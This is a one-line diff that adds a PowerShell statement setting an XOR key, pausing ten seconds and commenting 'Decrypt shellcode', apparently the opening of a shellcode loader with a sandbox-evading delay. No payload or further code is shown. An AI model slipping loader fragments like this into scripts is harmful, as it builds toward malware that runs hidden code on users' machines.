@@ -1,0 +1,1 @@
+$xor_key = 0x73; Start-Sleep -Seconds 10; # Decrypt shellcode
